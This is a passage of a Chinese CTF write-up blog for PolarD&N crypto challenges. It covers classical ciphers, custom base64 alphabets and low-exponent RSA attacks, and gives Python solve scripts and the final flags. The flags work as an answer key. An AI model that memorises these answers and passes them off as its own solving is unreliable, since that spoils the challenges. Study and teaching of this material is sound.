src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104004121424-1462638537-170498828945221.png"></p><p>显然是猪圈密码，但是不同于其他猪圈密码的是，没有了pigs四个字母，只需要往前移就可以</p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104004250225-599199040-170498828945223.png" alt="img"></p><p>对照解密即可</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{they_are_on_the_truck}</span><br></pre></td></tr></tbody></table></figure><h1 id="玩转数独"><a href="#玩转数独" class="headerlink" title="玩转数独"></a>玩转数独</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">（1,3,2,2）</span><br><span class="line">（1,3,3,1）</span><br><span class="line">（3,2,2,2）</span><br><span class="line">（3,1,1,3）</span><br><span class="line">（2,2,2,2）</span><br><span class="line">（2,2,1,2）</span><br><span class="line">（1,2,3,1）</span><br><span class="line">（2,3,1,3）</span><br><span class="line">（3,3,3,3）</span><br><span class="line"></span><br><span class="line">记得结果MD5小写套上flag{}哟~</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104005009182-709936772-170498828945225.jpg" alt="猜一猜"></p><p>数独在线解</p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104004840967-1133501750-170498828945227.png" alt="image-20240104004836564"></p><p>附件给的四维坐标，没啥头绪，看看博客</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">观察坐标，每组坐标有四个元素，但每个元素的范围都是在1-3，所以想到是不是分成了两个坐标系。一个大的，一个小的</span><br></pre></td></tr></tbody></table></figure><p>前两个定位方块，后两个定位数字</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">692998839</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{e19ba6a38dae099e68e3d05f7447755b}</span><br></pre></td></tr></tbody></table></figure><h1 id="堂吉诃德走入猪圈"><a href="#堂吉诃德走入猪圈" class="headerlink" title="堂吉诃德走入猪圈"></a>堂吉诃德走入猪圈</h1><p>附件内容</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">得到答案用MD532位小写加密套上flag{}</span><br><span class="line">压缩包密码为数字</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104092252726-1221263519-170498828945229.jpg" alt="img"></p><p>堂吉诃德分别对应” 678 5 56 67 “，第一眼让人很摸不着头脑，但是试了几次，发现就是找笔画</p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104093101272-2015010010-170498828945231.png" alt="image-20240104093059295"></p><p>对应猪圈密码找到数字是”5748“，解压得到flag.txt,</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">TIAMO</span><br></pre></td></tr></tbody></table></figure><p>将其转换为MD5小写</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{ccc49f40c1c0dd3c0f3bd7da83eb2643}</span><br></pre></td></tr></tbody></table></figure><h1 id="Round"><a href="#Round" class="headerlink" title="Round"></a>Round</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">这里有两串密码，来找找flag在哪吧</span><br><span class="line">（听说阿拉伯数字全世界通用哦）</span><br><span class="line"></span><br><span class="line">和谐民主和谐富强和谐民主和谐自由和谐富强和谐民主和谐自由和谐富强和谐文明和谐富强和谐民主和谐自由和谐富强和谐爱国和谐爱国和谐民主和谐富强和谐爱国</span><br><span class="line">和谐爱国和谐自由和谐文明和谐民主和谐富强和谐民主和谐富强和谐爱国和谐爱国和谐自由和谐民主和谐富强和谐爱国和谐爱国和谐文明和谐富强和谐民主和谐富强和谐爱</span><br><span class="line">国和谐爱国和谐自由和谐文明和谐富强和谐爱国和谐爱国和谐自由和谐文明和谐民主和谐富强和谐爱国和谐爱国和谐自由和谐文明和谐民主和谐富强和谐爱国和谐爱国和谐</span><br><span class="line">自由和谐文明和谐民主和谐富强和谐爱国和谐爱国和谐自由和谐文明和谐民主和谐富强和谐爱国和谐爱国和谐自由和谐文明和谐民主</span><br><span class="line"></span><br><span class="line">lqbehgfdajmopcikn</span><br><span class="line"></span><br><span class="line">将找到的字符串进行md5加密后套上flag{}即可</span><br></pre></td></tr></tbody></table></figure><p>把社会主义核心价值观编码连起来解密</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">1014014020140881088421010884108820108842088421088421088421088421088421</span><br></pre></td></tr></tbody></table></figure><p>只有”01248“，云影加密</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">a = <span class="string">"1014014020140881088421010884108820108842088421088421088421088421088421"</span></span><br><span class="line">a = a.split(<span class="string">"0"</span>)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">str</span> = a[i]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="built_in">sum</span> += <span class="built_in">int</span>(i)</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">sum</span> + <span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#AEEBEQWAURAVWWWWW</span></span><br></pre></td></tr></tbody></table></figure><p>第一个txt文件给的是轮转机加密</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">转轮密码机由多个转轮构成，每个转轮旋转的速度都不一样，比如有3个转轮，分别标号为1,2,3，其中1号转轮转动26个字母后，2号转轮就转动一个字母，当2号转轮转动26个字母后，3号转轮就转动1个字母。因此，当转轮密码机转动26X26X26次后，所有转轮恢复到初始状态，即3个转轮密码机的一个周期长度为26X26X26（17576）的多表代换密码。</span><br></pre></td></tr></tbody></table></figure><p>所以把”lqbehgfdajmopcikn“换成字符”12,17,2,5,8,7,6,4,1,10,13,15,16,3,9,11,14“</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text=<span class="string">""</span></span><br><span class="line">code = [</span><br><span class="line"><span class="string">"BRUEIFYRGBEUNVUICRHFU"</span>,</span><br><span class="line"><span class="string">"FYURGUAROINNIEURYVYRU"</span>,</span><br><span class="line"><span class="string">"E3BYUGDUWRNYUTFSRDE5W"</span>,</span><br><span class="line"><span class="string">"FURYGRUTGUTUNAWGDUIEB"</span>,</span><br><span class="line"><span class="string">"UYGIGNGIHFYBFYURGFURB"</span>,</span><br><span class="line"><span class="string">"TFRUBYFUVOVNERTWINDUE"</span>,</span><br><span class="line"><span class="string">"HUGRURBIGGNSUITIMTQEI"</span>,</span><br><span class="line"><span class="string">"GBUTNGUIJTINGIEGFURYU"</span>,</span><br><span class="line"><span class="string">"TYVCTYSAIBYEIFWIRHUGF"</span>,</span><br><span class="line"><span class="string">"TRTUBGUYTRGSONIUONRRI"</span>,</span><br><span class="line"><span class="string">"6YMUYTNYTIUWABRWBTESS"</span>,</span><br><span class="line"><span class="string">"BRUHGUFGTJNUBAFDEGTEF"</span>,</span><br><span class="line"><span class="string">"DHYEUBFYEYFTYUEBFIUBA"</span>,</span><br><span class="line"><span class="string">"CTBRTNUKMIWGRBEHSDDVC"</span>,</span><br><span class="line"><span class="string">"RUEBFUIRGFRBVXUAVTYEF"</span>,</span><br><span class="line"><span class="string">"YUGRTFBUKCZUIWEIHUEFB"</span>,</span><br><span class="line"><span class="string">"FRVRUIYUFRLNRUYGQEBYE"</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line">codetext=<span class="string">"AEEBEQWAURAVWWWWW"</span></span><br><span class="line">codenum = <span class="string">"12,17,2,5,8,7,6,4,1,10,13,15,16,3,9,11,14"</span></span><br><span class="line">codenum=codenum.split(<span class="string">","</span>)<span class="comment">#把这些数字都弄到一个里面去</span></span><br><span class="line"><span class="comment">#print(codenum)</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密后的："</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> codenum:</span><br><span class="line">    index=code[<span class="built_in">int</span>(i)-<span class="number">1</span>].index(codetext[a])</span><br><span class="line">    a=a+<span class="number">1</span></span><br><span class="line">    code[<span class="built_in">int</span>(i)-<span class="number">1</span>]=code[<span class="built_in">int</span>(i)-<span class="number">1</span>][index:]+code[<span class="built_in">int</span>(i)-<span class="number">1</span>][:index]</span><br><span class="line">    <span class="built_in">print</span>(code[<span class="built_in">int</span>(i)-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#完成了变形了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"下面是每一列的"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code[<span class="number">0</span>])):</span><br><span class="line">      <span class="built_in">str</span>=<span class="string">""</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"第{}列的是:"</span>.<span class="built_in">format</span>(i),end=<span class="string">""</span>)</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> codenum:</span><br><span class="line">          <span class="built_in">str</span>+=code[<span class="built_in">int</span>(j)-<span class="number">1</span>][i]</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">str</span>.lower())</span><br></pre></td></tr></tbody></table></figure><p>得到 ” 第14列的是:flagisvucuuub3ayr “</p><p>flag转化大写后再MD5</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{52c85c0bb38a8fc993d335401b56d9b6}</span><br></pre></td></tr></tbody></table></figure><h1 id="low-encryption-exponent-RSA"><a href="#low-encryption-exponent-RSA" class="headerlink" title="low encryption exponent RSA"></a>low encryption exponent RSA</h1><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding = utf-8 -*-</span></span><br><span class="line"><span class="comment"># @software:PyCharm</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b'***********************'</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = getRandomNBitInteger(<span class="number">2048</span>)</span><br><span class="line">e = <span class="number">5</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#n=18049146130359556157811138499355569967231668855528566823643376144155931993553424757354835027829037263429007310779886281743425186527415596058004878860570474866413182148724803537036078612785180550377667299555519230603647447077725080756322343538156406080031959768393145744701092093127752647143419553963316375696232038952573236311522683541862835602321038621904842874356522524316864553501304106884213097353522958546518042728628006318129608745487662533959888992223736595503203451378533217004433230837006796341055201266431153548000348148960250455415972226546646460918890401484239320725539304914347952245606818833495867312063</span></span><br><span class="line"><span class="comment">#c=377041108412334062897923100149371833160065752130578483588828849399791858197434981428466047315212724764223394695011882740933537996983126187094472520344493047769519118482187945467176598341785927269390299847888131061799861412055502165865052720513992259109503509827127768615772091500352075827289290029872935215672798059068944088543667111296361405639896493856695176145088430237388172420390881291650155157688737470414069130558367036786376549227175617218017578125</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">小王在学习了RSA加密后知道了，当n非常大时，将n拆分成两个素数相乘就变得十分困难，从而能够保证加密的安全性， 于是小王自以为是的使用了函数自动生成了很大的n，以为这样就很安全了，但他似乎没有考虑e对c的影响</span><br></pre></td></tr></tbody></table></figure><p>常规的低加密指数攻击</p><p>exp:</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">0x5</span></span><br><span class="line">n = <span class="number">18049146130359556157811138499355569967231668855528566823643376144155931993553424757354835027829037263429007310779886281743425186527415596058004878860570474866413182148724803537036078612785180550377667299555519230603647447077725080756322343538156406080031959768393145744701092093127752647143419553963316375696232038952573236311522683541862835602321038621904842874356522524316864553501304106884213097353522958546518042728628006318129608745487662533959888992223736595503203451378533217004433230837006796341055201266431153548000348148960250455415972226546646460918890401484239320725539304914347952245606818833495867312063</span></span><br><span class="line">c = <span class="number">377041108412334062897923100149371833160065752130578483588828849399791858197434981428466047315212724764223394695011882740933537996983126187094472520344493047769519118482187945467176598341785927269390299847888131061799861412055502165865052720513992259109503509827127768615772091500352075827289290029872935215672798059068944088543667111296361405639896493856695176145088430237388172420390881291650155157688737470414069130558367036786376549227175617218017578125</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c+k*n,e)  <span class="comment">#c+k*n 开5次方根 能开5次方即可</span></span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>]))) <span class="comment">#转为字符串</span></span><br><span class="line">        <span class="built_in">print</span>(res[<span class="number">0</span>])</span><br><span class="line">    k=k+<span class="number">1</span></span><br><span class="line"><span class="comment">#b'flag{fea80b814dcb0ff0a17e36c1e72569e7}'</span></span><br></pre></td></tr></tbody></table></figure><h1 id="AFF"><a href="#AFF" class="headerlink" title="AFF"></a>AFF</h1><p>明显的仿射密码</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">flag = <span class="string">"WMPTPTRGGPED"</span></span><br><span class="line">flaglist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    flaglist.append(<span class="built_in">ord</span>(i)-<span class="number">97</span>)</span><br><span class="line">flags = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flaglist:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">        c = (<span class="number">3</span> * j - <span class="number">17</span>) % <span class="number">26</span></span><br><span class="line">        <span class="keyword">if</span>(c == i):</span><br><span class="line">            flags += <span class="built_in">chr</span>(j+<span class="number">97</span>)</span><br><span class="line"><span class="built_in">print</span>(a,b,flag)</span><br></pre></td></tr></tbody></table></figure><p>读代码可知a = 3,b = 17,c = WMPTPTRGGPED</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">thisisaffine</span><br><span class="line">flag{THISISAFFINE}</span><br></pre></td></tr></tbody></table></figure><h1 id="BASE"><a href="#BASE" class="headerlink" title="BASE"></a>BASE</h1><p>明显的base64换表</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">j2rXjx8wSZjD</span><br><span class="line">GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=+/</span><br></pre></td></tr></tbody></table></figure><p>cyberchef</p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104102853273-616437349-170498833297533.png" alt="image-20240104102849161"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{666}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PolarD&amp;N—Crypto中等</title>
      <link href="/2024/01/08/polard-n-crypto-zhong-deng/"/>
      <url>/2024/01/08/polard-n-crypto-zhong-deng/</url>
      
        <content type="html"><![CDATA[<h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><p>下载附件，是一个拨号音，dtmf2num，执行得到：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">1*0000*00*000*001101*00*000*001101*11*111*010*000*0</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/image-20231219224525158.png" alt="image-20231219224525158"></p><p>题目说的二进制根本无法解决问题，试试摩斯密码，1为长，0为短，*为间隔符</p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/image-20231219225303366.png" alt="image-20231219225303366"></p><p>输出“T H I S _ I S _ M O R S E”</p><p>flag{T H I S _ I S _ M O R S E}，flag并不是这个，试试32小写的MD5</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{5cb1d685cef76505e56ee5d49f33ba32}</span><br></pre></td></tr></tbody></table></figure><h1 id="FB"><a href="#FB" class="headerlink" title="FB"></a>FB</h1><p>题目是图片和“VERAYTRGUYTLOUYTFDRKONMLKJOPGF65DD”</p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/clip_image002.png" alt="71154835a8c75cfae6ed077ee06abf1"></p><p>图片是斐波那契数列螺旋线，想到斐波那契数列{“1，1，2，3，5，8，13，21，34，55，89…….”}</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">dic = <span class="string">b'VERAYTRGUYTLOUYTFDRKONMLKJOPGF65DD'</span></span><br><span class="line">dic_list = <span class="built_in">list</span>(dic)</span><br><span class="line">Fibonacci = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">34</span>]</span><br><span class="line"><span class="built_in">str</span> = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Fibonacci:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(dic_list[i-<span class="number">1</span>]))</span><br><span class="line">    <span class="built_in">str</span> += <span class="built_in">chr</span>(dic_list[i-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># VVERYGOOD</span></span><br></pre></td></tr></tbody></table></figure><p>由于数组首位是0号地址所以在 <strong>dic_list[i-1]</strong> 部分需要 “-1” </p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{VVERYGOOD}</span><br></pre></td></tr></tbody></table></figure><h1 id="多表替换"><a href="#多表替换" class="headerlink" title="多表替换"></a>多表替换</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">Tsxul lsi fuxvave ek awpt tzii jnn dama udcthft xo xnfo eiem ezl wwep tpbd il hmxv save zzqb odnj swelfv hye lnm eyro rko gska! Ajivx varl sww lqcm ld irptp;nz xlxxp pbw iwki hy vl;ti rszm pgo eccj ih tt,gentxzp zsn nlmr qzhv dbo afxi vyc hew wpccst mg st awe wop ulbtrj lqg sxch dd ag.Qvj xhl zudg tddnyw maailuptw mu xrxg kkr hkotq,wrjffa kjcinh jd fszj yzn vacprz,kyfhit olgfyl qg ozpo rfm bcopd,tggjlh shsl ep qtqp pbw twmem? Katscn atm pgozutbu bf dyhpkv’zspil.Oq pbw raba hrpq ax cfqmj qic,ki fghtpglj axyet xak zkugd lbggyc, qgs.Osd arhjqghj dy httpwx gvy’u rxipjfcdein vkkb llz mdlk gz mxthnmzxsg;eahf uvwm slbr vta jdgd dc wzzcxmyaho vwqi vgbjs lerur ulxoc nna.Twmewxtpk pdpr yfj npqhu lag rwy,earzp xlh nfig, vtkpt krd eszz ddtiubmf,ubpz ah cilh clyh dno mrai odlcu mwlfk xsngx shl vwehx owt hloh acjiw,lzi bpxu qwsi rxf ekaqxtaubg ixt beetretqjp pj ikzgyg idl woft qgyxsdw kzyqt aykxk.Atvp uhntow poey n uyeit,ubdtk adeg t bama cct tgvh biea d apbv.Mnp seksdqtgd urlymp vbcd utypoh uw qfspw ru l gskmzkggz lxhh, idr uei’e fh ff qmna yc eaujuymls jpy eke xb qr uljf zppl jvtkniwm ips xttjifcsxv.Dsfr ruf nrtq xlgb,idr oimp bkpaho cct towgdoyx dyzvrw ezl jce ojxzscd.Dmqp xhlj fqht id mzpy wsxq fzv hbk,jfh'tq pet cxt tzs dd rfzdcvi pds xntwyzgh hcpygj jfh ke yonwxv.</span><br></pre></td></tr></tbody></table></figure><p>维吉尼亚密码，但是题目没给key，<a href="https://www.guballa.de/vigenere-solver">Vigenere Solver | guballa.de</a>，在线破解</p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/image-20231225220647565.png" alt="image-20231225220647565"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">There are moments in life when you miss someone so much that you just want to pick them from your dreams and hug them for real! Dream what you want to dream;go where you want to go;be what you want to be,because you have only one life and one chance to do all the things you want to do.May you have enough happiness to make you sweet,enough trials to make you strong,enough sorrow to keep you human,enough hope to make you happy? Always put yourself in others’shoes.If you feel that it hurts you,it probably hurts the other person, too.The happiest of people don’t necessarily have the best of everything;they just make the most of everything that comes along their way.Happiness lies for those who cry,those who hurt, those who have searched,flag is xiao zeng zui bang chong chong chong and those who have tried,for only they can appreciate the importance of people who have touched their lives.Love begins with a smile,grows with a kiss and ends with a tear.The brightest future will always be based on a forgotten past, you can’t go on well in lifeuntil you let go of your past failures and heartaches.When you were born,you were crying and everyone around you was smiling.Live your life so that when you die,you're the one who is smiling and everyone around you is crying.</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag is xiao zeng zui bang chong chong chong</span><br><span class="line"></span><br><span class="line">flag{xiao zeng zui bang chong chong chong}</span><br></pre></td></tr></tbody></table></figure><h1 id="拒绝固定思维"><a href="#拒绝固定思维" class="headerlink" title="拒绝固定思维."></a>拒绝固定思维.</h1><p>题目</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">gmbhvpuufnwoneusnowscrrvuwutotfnwobe</span><br></pre></td></tr></tbody></table></figure><p>还有一张64位字典，猜测base64换表</p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/%E6%8B%92%E7%BB%9D%E5%9B%BA%E5%AE%9A%E6%80%9D%E7%BB%B4.png" alt="拒绝固定思维"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">dict</span>={<span class="number">0</span>: <span class="string">'J'</span>, <span class="number">1</span>: <span class="string">'K'</span>, <span class="number">2</span>: <span class="string">'L'</span>, <span class="number">3</span>: <span class="string">'M'</span>, <span class="number">4</span>: <span class="string">'N'</span>, <span class="number">5</span>: <span class="string">'O'</span>, <span class="number">6</span>: <span class="string">'x'</span>, <span class="number">7</span>: <span class="string">'y'</span>, <span class="number">8</span>: <span class="string">'U'</span>, <span class="number">9</span>: <span class="string">'V'</span>, <span class="number">10</span>: <span class="string">'z'</span>, <span class="number">11</span>: <span class="string">'A'</span>, <span class="number">12</span>: <span class="string">'B'</span>, <span class="number">13</span>: <span class="string">'C'</span>, <span class="number">14</span>: <span class="string">'D'</span>, <span class="number">15</span>: <span class="string">'E'</span>, <span class="number">16</span>: <span class="string">'F'</span>, <span class="number">17</span>: <span class="string">'G'</span>, <span class="number">18</span>: <span class="string">'H'</span>, <span class="number">19</span>: <span class="string">'7'</span>, <span class="number">20</span>: <span class="string">'8'</span>, <span class="number">21</span>: <span class="string">'9'</span>, <span class="number">22</span>: <span class="string">'P'</span>, <span class="number">23</span>: <span class="string">'Q'</span>, <span class="number">24</span>: <span class="string">'I'</span>, <span class="number">25</span>: <span class="string">'a'</span>, <span class="number">26</span>: <span class="string">'b'</span>, <span class="number">27</span>: <span class="string">'c'</span>, <span class="number">28</span>: <span class="string">'d'</span>, <span class="number">29</span>: <span class="string">'e'</span>, <span class="number">30</span>: <span class="string">'f'</span>, <span class="number">31</span>: <span class="string">'g'</span>, <span class="number">32</span>: <span class="string">'h'</span>, <span class="number">33</span>: <span class="string">'i'</span>, <span class="number">34</span>: <span class="string">'j'</span>, <span class="number">35</span>: <span class="string">'k'</span>, <span class="number">36</span>: <span class="string">'l'</span>, <span class="number">37</span>: <span class="string">'m'</span>, <span class="number">38</span>: <span class="string">'W'</span>, <span class="number">39</span>: <span class="string">'X'</span>, <span class="number">40</span>: <span class="string">'Y'</span>, <span class="number">41</span>: <span class="string">'Z'</span>, <span class="number">42</span>: <span class="string">'0'</span>, <span class="number">43</span>: <span class="string">'1'</span>, <span class="number">44</span>: <span class="string">'2'</span>, <span class="number">45</span>: <span class="string">'3'</span>, <span class="number">46</span>: <span class="string">'4'</span>, <span class="number">47</span>: <span class="string">'5'</span>, <span class="number">48</span>: <span class="string">'6'</span>, <span class="number">49</span>: <span class="string">'R'</span>, <span class="number">50</span>: <span class="string">'S'</span>, <span class="number">51</span>: <span class="string">'T'</span>, <span class="number">52</span>: <span class="string">'n'</span>, <span class="number">53</span>: <span class="string">'o'</span>, <span class="number">54</span>: <span class="string">'p'</span>, <span class="number">55</span>: <span class="string">'q'</span>, <span class="number">56</span>: <span class="string">'r'</span>, <span class="number">57</span>: <span class="string">'s'</span>, <span class="number">58</span>: <span class="string">'t'</span>, <span class="number">59</span>: <span class="string">'u'</span>, <span class="number">60</span>: <span class="string">'v'</span>, <span class="number">61</span>: <span class="string">'w'</span>, <span class="number">62</span>: <span class="string">'+'</span>, <span class="number">63</span>: <span class="string">'/'</span>, <span class="number">64</span>: <span class="string">'='</span>}</span><br><span class="line">base64_list = [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>,<span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>,<span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>,<span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span>]</span><br><span class="line">chiper=<span class="string">'gmbhvpuufnwoneusnowscrrvuwutotfnwobe'</span></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chiper)):</span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">dict</span>[j]==chiper[i]):</span><br><span class="line">   res+=base64_list[j]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">flag=base64.b64decode(res)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag8277e0910d750195b448797616e091ad</span></span><br></pre></td></tr></tbody></table></figure><h1 id="rsa-低加密指数攻击"><a href="#rsa-低加密指数攻击" class="headerlink" title="rsa_低加密指数攻击"></a>rsa_低加密指数攻击</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">e=2</span><br><span class="line">c=2594630690186395245440809641065619753515806274525685258002015552974424372384220768472440321906989149138846141572994218682480369570277158812043800473893692951205617309664934593801</span><br></pre></td></tr></tbody></table></figure><p>e = 2，很小，低加密指数攻击</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">c = <span class="number">2594630690186395245440809641065619753515806274525685258002015552974424372384220768472440321906989149138846141572994218682480369570277158812043800473893692951205617309664934593801</span></span><br><span class="line">m = gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="string">b'flag{Rsa_iS_Rea11y_FuN_And_1_LiK3_It}'</span></span><br></pre></td></tr></tbody></table></figure><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>得到公钥文件和txt</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">c= 45625231811262991226691619409422035605300147488561697600920431336997120491388</span><br><span class="line">flag格式：flag{md5(m)}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td 